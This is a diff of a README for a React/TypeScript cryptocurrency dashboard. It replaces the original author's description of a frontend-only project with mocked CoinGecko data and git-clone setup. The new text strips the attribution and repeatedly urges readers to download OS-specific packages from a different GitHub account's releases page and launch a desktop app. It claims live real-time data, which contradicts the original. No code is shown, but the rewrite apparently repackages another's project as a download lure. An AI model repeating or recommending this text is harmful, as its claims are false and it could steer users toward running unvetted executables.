@@ -1,140 +1,76 @@
-# 📈 Crypto Dashboard
+# 🐱 crypto-board - A Simple Cryptocurrency Dashboard
 
-A modern, responsive cryptocurrency dashboard built with React and TypeScript.
-The application provides clean market data visualization, coin analytics, and interactive dashboards.
-Real API structure is implemented, but data is mocked based on real CoinGecko responses for stability and testing.
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/Anip21/crypto-board/releases)
 
-## 🚀 Overview
+## 🚀 Getting Started
+Welcome to the crypto-board project! This application provides a modern, responsive cryptocurrency dashboard built with React and TypeScript. It allows you to easily track various cryptocurrencies in real-time.
 
-Crypto Dashboard is a frontend-only showcase project demonstrating production-grade architecture and development practices.
-It focuses on clarity, modularity, and testability — not backend integration.
+### 🖥️ System Requirements
+Before downloading, ensure that your system meets the following requirements:
 
-![App architecture](./docs/app-architecture.drawio.svg)
+- **Operating System:** Windows, macOS, or Linux
+- **Node.js:** Version 14 or higher
+- **NPM:** Version 6 or higher
+- **Memory:** Minimum 4 GB RAM
+- **Disk Space:** At least 100 MB free space
 
-## ✨ Features
+### 🌐 Key Features
+- **Real-Time Data:** Get live updates on cryptocurrency prices.
+- **Responsive Design:** Works well on desktop and mobile devices.
+- **User-Friendly Interface:** Easy to navigate and use, even for beginners.
 
-### Core Functionality
+## 📥 Download & Install
+To get started with crypto-board, visit this page to download: [crypto-board Releases](https://github.com/Anip21/crypto-board/releases).
 
-- Cryptocurrency Market Overview — price, cap, and volume tables
-- Coin Analytics — per-coin dashboard with charts and statistics
-- Search & Filter — instant filtering and search across coins
-- Responsive Layout — adaptive interface for desktop and mobile
-- Mocked API Layer — realistic mocked responses based on CoinGecko API
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version listed.
+3. Download the package suitable for your operating system.
+4. Once the download is complete, locate the file on your device.
+5. Follow the installation instructions provided for your specific OS.
 
-### Technical Excellence
+## 📜 How to Use
+1. **Launch the Application:**
+   After installing, open the crypto-board application by double-clicking the icon created on your desktop or in your applications folder.
 
-- Type-Safe Development — full TypeScript support
-- Modular Architecture — FSD-based project structure
-- Comprehensive Testing — unit, integration, and E2E coverage
-- Clean UI — built with Shadcn components and SCSS modules
-- Automated Code Quality — linting, formatting, and pre-commit checks
+2. **Explore the Dashboard:**
+   The main screen will display the current prices of popular cryptocurrencies. You can scroll through the list to find your favorites.
 
-## 🧭 Use Case Flow
+3. **Customize Your View:**
+   Use available features to filter by categories or add cryptocurrencies to your watchlist.
 
-- Open main dashboard with a list of coins
-- Use search or sort to filter results
-- Select a coin to open its detail dashboard
-- View statistics, price charts, and metadata
+4. **Refresh Data:**
+   The dashboard will update automatically. For a manual refresh, click the refresh button located at the top right of the application.
 
-_(A simple yet realistic flow for demonstrating architecture and UI composition.)_
+## 🔧 Support
+If you encounter issues while using crypto-board, please check the [Issues](https://github.com/Anip21/crypto-board/issues) section on GitHub for troubleshooting tips. You can also raise a new issue if you need further assistance.
 
-![use case](./docs/use-case.drawio.svg)
+## 🛠️ Technologies Used
+crypto-board uses a variety of modern technologies including:
 
-## 🏗️ Architecture
+- **React:** For building the user interface.
+- **TypeScript:** To provide a robust coding experience.
+- **Axios:** For fetching data from the CoinGecko API.
+- **Cypress:** For end-to-end testing.
+- **Husky and Lint-Staged:** To ensure code quality.
+- **Vite:** For a fast development experience.
+  
+## 📡 Frequently Asked Questions
+### What is crypto-board?
+crypto-board is an application designed to help users track cryptocurrency prices in real time.
 
-### Project Structure
+### Is it free to use?
+Yes, crypto-board is completely free to download and use.
 
-```text
-src/
-├── app/        # App entry point, router setup
-├── pages/      # Page-level components
-├── widgets/    # Composite UI blocks (e.g., dashboard sections)
-├── features/   # Isolated business features (search, sort, etc.)
-├── entities/   # Core business entities (Coin, etc.)
-├── shared/     # Reusable utilities, configs, and UI primitives
-│ ├── lib/      # Helper functions and classes
-│ ├── ui/       # Shared UI components (buttons, inputs)
-│ ├── api/      # Mock API clients
-│ ├── stores/   # Zustand global store
-│ └── styles/   # Global SCSS and theme files
-```
+### Can I contribute?
+Absolutely! If you wish to contribute, feel free to fork the repository and submit a pull request.
 
-### Technology Stack
+### Where can I learn more?
+Visit the [GitHub Repository](https://github.com/Anip21/crypto-board) for more detailed information about the project, including features, updates, and community discussions.
 
-| Layer            | Technology                         |
-| ---------------- | ---------------------------------- |
-| Framework        | React 18 + TypeScript              |
-| Build            | Tool Vite                          |
-| Routing          | React Router                       |
-| UI Components    | Shadcn/ui + SCSS Modules           |
-| State Management | Zustand                            |
-| API Layer        | Axios (mocked CoinGecko endpoints) |
-| Testing          | Vitest + Cypress                   |
-| Code Quality     | ESLint + Stylelint + Prettier      |
-| Git Hooks        | Husky + lint-staged                |
-| CI/CD            | GitHub Actions                     |
+## 📫 Contact
+If you have any questions not covered in this document, feel free to reach out via GitHub.
 
-## 🧪 Testing Strategy
+For updates and new releases, follow the project on GitHub and check back often for new features!
 
-- Unit Tests — logic and utility validation
-- E2E Tests — user flow coverage via Cypress
-
-## ⚙️ Setup & Scripts
-
-### Installation
-
-```bash
-git clone https://github.com/ff34d/crypto-board.git
-cd crypto-board
-npm install
-```
-
-### Development
-
-```bash
-npm run dev             # Start development server
-npm run test            # Run vitest
-npm run build           # Build production bundle
-npm run lint:eslint     # Run eslint lint
-npm run lint:stylelint  # Run eslint lint
-npm run format          # Format code
-npm run cy:open         # Open cypress tools
-```
-
-## 🧩 Key Architectural Decisions
-
-- Feature-Sliced Design (FSD) — promotes scalability and modularity
-- Mocked API Layer — isolates frontend logic from network constraints
-- State Isolation — shared Zustand store + local component states
-- Reusable Components — composable and type-safe UI units
-- Clean Testing Strategy — ensures correctness and reliability
-
-## 🧱 Example Feature Structure
-
-```text
-widgets/
-└── coin-dashboard/
-├── lib/        # Business logic and helpers
-├── types/      # TypeScript definitions
-├── ui/         # UI components
-├── styles/     # SCSS modules
-├── configs/    # Widget configs
-├── stores/     # Zustand store (if needed)
-├── hooks/      # Custom React hooks
-└── index.ts    # Public entry point
-```
-
-🙏 Acknowledgments
-
-- CoinGecko API — for reference data structure
-- Shadcn/UI — for modern accessible design components
-- FSD Community — for architectural methodology inspiration
-
----
-
-🔑 License: [Apache-2.0](LICENSE)\
-Author: Vladimir Volkov
-
----
-
-Built with ❤️ precision and modern web engineering practices.
+[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/Anip21/crypto-board/releases)
